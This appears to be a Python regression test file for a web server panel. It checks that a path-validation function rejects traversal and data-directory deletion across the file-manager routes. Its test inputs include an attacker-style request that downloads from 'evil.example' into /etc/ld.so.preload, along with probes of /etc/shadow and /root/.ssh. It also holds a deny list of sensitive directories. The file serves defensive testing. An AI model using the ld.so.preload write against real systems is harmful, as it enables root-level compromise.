# coding: utf-8
"""P0-3 之二：文件接口 safePath 缺口 + 删除黑名单缺口 的回归守卫。

测评报告 P0-3 的第二个口子（三.2 / 三.3 / 三.4 / 三.5）：

1. `/files/download_file`：`path` 未过 `safePath` 就 `os.path.abspath` 并拼
   `filename` 投递异步下载任务 —— `path=/etc` + `filename=ld.so.preload`
   可把攻击者 URL 内容写进任意目录（面板以 root 运行）。
2. `/files/get_dir`：`file.getAllDirList/getDirList` 全程无校验 → 任意目录列举。
3. `/files/check_exists_files`、`/files/get_dir_size`、`/files/file_access`：
   文件存在性 / 大小 / 权限预言机，均无 `safePath`。
4. 删除黑名单只拦 `/www/server` **本体**，`/www/server/mysql`、`/www/server/data`
   等关键数据目录可被文件管理器直接删除。

本轮修法与断言：
- 读入口（get_dir / check_exists_files / get_dir_size / file_access）补 `safePath(path)`；
- 写/删/下载落盘（download_file / fileDelete / dirDelete）走 `safePath(path, write=True)`，
  由 `safePath` 新增的 `_SENSITIVE_DATA_PREFIXES`（写模式）拒绝数据库/面板数据目录。

断言分三层：
- **直测** `safePath`：越界路径拒、正常路径放行、`/www/server` 下正常环境目录（php/nginx）
  写模式仍放行（证明没有一刀切封整个 `/www/server`）；
- **行为**：AST 抽出路由函数真调用，越界请求必须被拒（正对照：正常站点目录放行）；
- **结构**：源码里每个入口确实调了 `safePath`，防「检查写在 `if False:` 里」。

所有越界路径在 `safePath` 处即返回，不会触达真实文件系统 —— 用例不做任何真删/真写。
"""
import ast
import logging
import os
import sys
import tempfile
import types
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
WEB_DIR = os.path.join(ROOT, 'web')
if WEB_DIR not in sys.path:
    sys.path.insert(0, WEB_DIR)

FILE_PY = os.path.join(ROOT, 'web', 'utils', 'file.py')
FILES_PY = os.path.join(ROOT, 'web', 'admin', 'files', 'files.py')

PANEL_DIR = '/www/server/yufeng_panel'


def _read(path):
    with open(path, encoding='utf-8') as f:
        return f.read()


def _keep_nodes(path, assigns=(), funcs=()):
    """按 AST 抽出指定的模块级赋值与函数定义（不执行整个模块，避免拉起重依赖）。"""
    src = _read(path)
    tree = ast.parse(src)
    keep = []
    for node in tree.body:
        if isinstance(node, ast.Assign) and any(
                getattr(t, 'id', '') in assigns for t in node.targets):
            keep.append(node)
        elif isinstance(node, ast.FunctionDef) and node.name in funcs:
            # 路由函数带装饰器（@blueprint.route / @panel_login_required）：摘掉再执行
            node.decorator_list = []
            keep.append(node)
    return keep


class _FakeYf:
    """safePath / fileDelete / dirDelete 依赖的 yf 最小面。"""

    panel_dir = PANEL_DIR

    @classmethod
    def getPanelDir(cls):
        return cls.panel_dir

    @classmethod
    def returnData(cls, status, msg, data=None, *args):
        return {'status': status, 'msg': msg, 'data': data}

    @staticmethod
    def getInfo(tpl, args=()):
        return tpl

    @staticmethod
    def writeLog(*a, **k):
        return True

    @staticmethod
    def removeDir(path):
        return True

    @staticmethod
    def getFatherDir():
        return '/www/server'


class _FakeThisdb:
    @staticmethod
    def getOption(*a, **k):
        return ''

    @staticmethod
    def addTaskByDownload(**k):
        return True


def _load_utils_file():
    """执行 file.py 的 safePath / fileDelete / dirDelete（+ 黑名单常量）。"""
    nodes = _keep_nodes(
        FILE_PY,
        assigns=('_SENSITIVE_PATHS', '_SENSITIVE_EXACT',
                 '_SENSITIVE_DATA_PREFIXES', '_PANEL_SENSITIVE_REL'),
        funcs=('_posix_norm', 'safePath', 'fileDelete', 'dirDelete'),
    )
    ns = {
        'os': os,
        'yf': _FakeYf,
        'thisdb': _FakeThisdb,
        '_log': logging.getLogger('files-safepath-test'),
        'mvRecycleBin': lambda p: False,
        'getOccupyingProcess': lambda p: '',
    }
    exec(compile(ast.Module(body=nodes, type_ignores=[]), FILE_PY, 'exec'), ns)
    return ns


class _FileShim:
    """路由里 `import utils.file as file` 的最小替身：safePath 用真实现。"""

    def __init__(self, ns):
        self.safePath = ns['safePath']
        self.fileDelete = ns['fileDelete']
        self.dirDelete = ns['dirDelete']

    def getAccess(self, filename):
        return {'chmod': '755', 'chown': 'www'}

    def getSysUserList(self):
        return ['www', 'root']

    def getAllDirList(self, path, page, size, order, search):
        return {'count': 0, 'dir': [], 'files': [], 'path': path}

    def getDirList(self, path, page, size, order, search):
        return {'count': 0, 'dir': [], 'files': [], 'path': path}

    def getDirSizeByBash(self, path):
        return '0 B'


class _Req:
    def __init__(self, form=None, args=None):
        self.form = dict(form or {})
        self.args = dict(args or {})


def _load_route(name, file_shim, req, yf=None, os_shim=None):
    """抽出 files.py 的单个路由函数并执行，返回可调用的函数对象。"""
    nodes = _keep_nodes(FILES_PY, funcs=(name,))
    if not nodes:
        raise AssertionError('未找到路由函数 %s' % name)
    ns = {
        'os': os_shim if os_shim is not None else os,
        'json': __import__('json'),
        'file': file_shim,
        'yf': yf if yf is not None else _RouteYf,
        'request': req,
        'session': types.SimpleNamespace(get=lambda *a, **k: {}),
        'thisdb': _FakeThisdb,
        'logging': logging,
    }
    exec(compile(ast.Module(body=nodes, type_ignores=[]), FILES_PY, 'exec'), ns)
    return ns[name]


class _RouteYf:
    @staticmethod
    def returnData(status, msg, data=None, *args):
        return {'status': status, 'msg': msg, 'data': data}

    @staticmethod
    def getFatherDir():
        return '/www/server'

    @staticmethod
    def getPage(*a, **k):
        return ''

    @staticmethod
    def fileNameCheck(name):
        return True

    @staticmethod
    def triggerTask():
        return True


def _calls_in_func(name, callee_text):
    """路由函数源码里是否出现某个调用（文本匹配，含关键字形式）。"""
    src = _read(FILES_PY)
    tree = ast.parse(src)
    lines = src.splitlines()
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) and node.name == name:
            return callee_text in '\n'.join(lines[node.lineno - 1:node.end_lineno])
    raise AssertionError('未找到函数 %s' % name)


# 需要写模式（safePath(write=True)）才拒绝的关键数据目录
_DATA_PREFIXES = (
    '/www/server/data', '/www/server/mysql', '/www/server/mariadb',
    '/www/server/redis', '/www/server/valkey', '/www/server/pgsql',
    '/www/server/postgresql', '/www/server/panel', '/www/server/yufeng_panel',
)


class TestSafePathSensitiveDirs(unittest.TestCase):
    """直测 safePath：越界/敏感路径拒，正常运维路径放行。"""

    @classmethod
    def setUpClass(cls):
        cls.ns = _load_utils_file()
        cls.safePath = staticmethod(cls.ns['safePath'])

    # ---- 越界：读也要拒 ----

    def test_01_etc_rejected(self):
        ok, reason = self.safePath('/etc')
        self.assertFalse(ok, '/etc 未被拒绝')
        self.assertEqual(reason, 'FILE_DANGER')

    def test_02_etc_ld_so_preload_rejected_read_and_write(self):
        for write in (False, True):
            ok, reason = self.safePath('/etc/ld.so.preload', write=write)
            self.assertFalse(ok, 'write=%s 时 /etc/ld.so.preload 未被拒绝' % write)
            self.assertEqual(reason, 'FILE_DANGER')

    # ---- 删除黑名单缺口：写/删/下载落盘拒关键数据目录 ----

    def test_03_all_data_prefixes_rejected_write(self):
        for p in _DATA_PREFIXES:
            ok, reason = self.safePath(p, write=True)
            self.assertFalse(ok, '%s 写模式未被拒绝' % p)
            self.assertEqual(reason, 'FILE_SENSITIVE_DIR', p)

    def test_04_data_prefix_subpath_rejected_write(self):
        for p in ('/www/server/mysql/data/ibdata1',
                  '/www/server/data/panel.db',
                  '/www/server/mariadb/mysql/ib_logfile0'):
            ok, reason = self.safePath(p, write=True)
            self.assertFalse(ok, '%s 写模式未被拒绝' % p)
            self.assertEqual(reason, 'FILE_SENSITIVE_DIR', p)

    def test_05_data_prefix_with_trailing_slash_rejected_write(self):
        ok, _ = self.safePath('/www/server/mysql/', write=True)
        self.assertFalse(ok, '带尾斜杠的 /www/server/mysql/ 写模式未被拒绝')

    # ---- 正对照：正常运维路径仍放行 ----

    def test_06_wwwroot_allowed_read_and_write(self):
        for write in (False, True):
            ok, reason = self.safePath('/www/wwwroot/site/a.txt', write=write)
            self.assertTrue(ok, 'write=%s 时正常站点文件被误拒: %s' % (write, reason))

    def test_07_server_env_dirs_allowed_write(self):
        """没有一刀切封整个 /www/server：php/nginx 等环境目录写模式必须放行。"""
        for p in ('/www/server/php/72/bin/php', '/www/server/nginx/conf/nginx.conf',
                  '/www/server/mysql_conf/x.cnf'):
            ok, reason = self.safePath(p, write=True)
            self.assertTrue(ok, '%s 被误拒: %s' % (p, reason))

    def test_08_data_prefix_read_not_blocked(self):
        """数据目录的**读**（浏览目录内容）不封，避免破坏插件/环境目录管理。"""
        ok, reason = self.safePath('/www/server/mysql')
        self.assertTrue(ok, '读模式不应拦 /www/server/mysql: %s' % reason)


class TestRouteGuards(unittest.TestCase):
    """行为层：AST 抽出路由函数真调用，越界请求必须被拒。"""

    @classmethod
    def setUpClass(cls):
        cls.ns = _load_utils_file()
        cls.file = _FileShim(cls.ns)

        # download_file 通过 `from utils.urlguard import validate_url` 取校验器：
        # 用替身固定为「放行」，这样一旦路由漏了 safePath，就会一路走到 addTaskByDownload
        # 并返回成功 —— 让漏修在断言里暴露成 status=True（而不是被 URL 校验失败掩盖）。
        fake_mod = types.ModuleType('utils.urlguard')
        fake_mod.validate_url = lambda url, resolve=False: (True, 'ok', {})
        cls._saved = sys.modules.get('utils.urlguard')
        sys.modules['utils.urlguard'] = fake_mod

    @classmethod
    def tearDownClass(cls):
        if cls._saved is None:
            sys.modules.pop('utils.urlguard', None)
        else:
            sys.modules['utils.urlguard'] = cls._saved

    def _reject(self, r, reason):
        self.assertFalse(r['status'], '越界请求未被拒绝: %r' % (r,))
        self.assertEqual(r['msg'], reason, r)

    # ---- get_dir ----

    def test_10_get_dir_rejects_etc(self):
        # os.path.exists 固定为 True，绕开「不存在则回退 wwwroot」的兜底分支
        os_shim = types.SimpleNamespace(
            path=types.SimpleNamespace(exists=lambda p: True))
        fn = _load_route('get_dir', self.file,
                         _Req({'path': '/etc'}), os_shim=os_shim)
        self._reject(fn(), 'FILE_DANGER')

    def test_11_get_dir_allows_wwwroot(self):
        d = tempfile.mkdtemp(prefix='yf_safepath_site_')
        self.addCleanup(__import__('shutil').rmtree, d, True)
        fn = _load_route('get_dir', self.file, _Req({'path': d}))
        r = fn()
        self.assertIsNot(r.get('status'), False, '正常目录被误拒: %r' % (r,))
        self.assertIn('count', r)

    def test_11b_get_dir_allows_root(self):
        """正对照：文件管理器「根目录」入口 getFiles('/') 只读列举必须放行。

        P0-3 之二给 get_dir 加 safePath 后把 '/' 一并拒了（safePath 把根视为敏感），
        面包屑根节点打不开。本用例钉住那个特例：去掉它即变红。
        """
        os_shim = types.SimpleNamespace(
            path=types.SimpleNamespace(exists=lambda p: True))
        fn = _load_route('get_dir', self.file, _Req({'path': '/'}), os_shim=os_shim)
        r = fn()
        self.assertIsNot(r.get('status'), False, '根目录被误拒: %r' % (r,))
        self.assertIn('count', r)

    def test_11c_get_dir_root_exception_does_not_leak(self):
        """`/` 特例不得外溢：/etc、/root/.ssh 仍按 safePath 结果拒绝。"""
        os_shim = types.SimpleNamespace(
            path=types.SimpleNamespace(exists=lambda p: True))
        for p in ('/etc', '/root/.ssh'):
            fn = _load_route('get_dir', self.file, _Req({'path': p}), os_shim=os_shim)
            self._reject(fn(), 'FILE_DANGER')

    def test_11d_get_dir_follows_safepath_for_data_dir(self):
        """`/www/server/mysql` 读模式 safePath 放行 -> get_dir 仍放行（未误伤）。"""
        ok, _reason = self.ns['safePath']('/www/server/mysql')
        self.assertTrue(ok, '前置：safePath 读模式应放行 /www/server/mysql')
        os_shim = types.SimpleNamespace(
            path=types.SimpleNamespace(exists=lambda p: True))
        fn = _load_route('get_dir', self.file,
                         _Req({'path': '/www/server/mysql'}), os_shim=os_shim)
        r = fn()
        self.assertIsNot(r.get('status'), False, 'get_dir 未跟随 safePath 结果: %r' % (r,))

    # ---- check_exists_files ----

    def test_12_check_exists_rejects_etc(self):
        fn = _load_route('check_exists_files', self.file, _Req({'dfile': '/etc'}))
        self._reject(fn(), 'FILE_DANGER')

    def test_13_check_exists_rejects_sfile(self):
        d = tempfile.mkdtemp(prefix='yf_safepath_src_')
        self.addCleanup(__import__('shutil').rmtree, d, True)
        fn = _load_route('check_exists_files', self.file,
                         _Req({'dfile': d, 'sfile': '/etc/shadow'}))
        self._reject(fn(), 'FILE_DANGER')

    # ---- get_dir_size ----

    def test_14_get_dir_size_rejects_etc(self):
        fn = _load_route('get_dir_size', self.file, _Req({'path': '/etc'}))
        self._reject(fn(), 'FILE_DANGER')

    # ---- file_access ----

    def test_15_file_access_rejects_shadow(self):
        fn = _load_route('file_access', self.file, _Req({'filename': '/etc/shadow'}))
        self._reject(fn(), 'FILE_DANGER')

    # ---- download_file（写/落盘） ----

    def test_16_download_file_rejects_etc(self):
        fn = _load_route('download_file', self.file, _Req({
            'url': 'http://evil.example/ld.so.preload',
            'path': '/etc', 'filename': 'ld.so.preload'}))
        self._reject(fn(), 'FILE_DANGER')

    def test_17_download_file_rejects_mysql_write(self):
        fn = _load_route('download_file', self.file, _Req({
            'url': 'http://evil.example/x', 'path': '/www/server/mysql',
            'filename': 'evil.txt'}))
        self._reject(fn(), 'FILE_SENSITIVE_DIR')

    def test_18_download_file_allows_wwwroot(self):
        d = tempfile.mkdtemp(prefix='yf_safepath_dl_')
        self.addCleanup(__import__('shutil').rmtree, d, True)
        fn = _load_route('download_file', self.file, _Req({
            'url': 'http://ok.example/x', 'path': d, 'filename': 'x.txt'}))
        r = fn()
        self.assertTrue(r['status'], '正常下载目录被误拒: %r' % (r,))

    # ---- delete / delete_dir（走 fileDelete / dirDelete 的 safePath(write=True)） ----

    def test_19_file_delete_rejects_mysql(self):
        r = self.file.fileDelete('/www/server/mysql/my.cnf')
        self._reject(r, 'FILE_SENSITIVE_DIR')

    def test_20_dir_delete_rejects_data(self):
        r = self.file.dirDelete('/www/server/data')
        self._reject(r, 'FILE_SENSITIVE_DIR')

    def test_21_file_delete_rejects_etc(self):
        r = self.file.fileDelete('/etc/ld.so.preload')
        self._reject(r, 'FILE_DANGER')


class TestStructuralWiring(unittest.TestCase):
    """结构层：源码里每个入口确实调了 safePath（防「检查写在 if False: 里」）。"""

    def test_30_read_entries_call_safepath(self):
        for fn in ('check_exists_files', 'get_dir', 'get_dir_size', 'file_access'):
            self.assertTrue(_calls_in_func(fn, 'file.safePath('),
                            '%s 未走 safePath' % fn)

    def test_31_write_entry_calls_safepath_write(self):
        self.assertTrue(_calls_in_func('download_file', 'file.safePath(path, write=True)'),
                        'download_file 未以写模式过 safePath')

    def test_32_safepath_has_sensitive_write_prefixes(self):
        src = _read(FILE_PY)
        self.assertIn('_SENSITIVE_DATA_PREFIXES', src)
        tree = ast.parse(src)
        body = ''
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef) and node.name == 'safePath':
                lines = src.splitlines()
                body = '\n'.join(lines[node.lineno - 1:node.end_lineno])
        self.assertIn('if write:', body, 'safePath 未使用 write 参数区分写模式')
        self.assertIn('_SENSITIVE_DATA_PREFIXES', body,
                      'safePath 写模式未检查关键数据目录前缀')


if __name__ == '__main__':
    unittest.main()
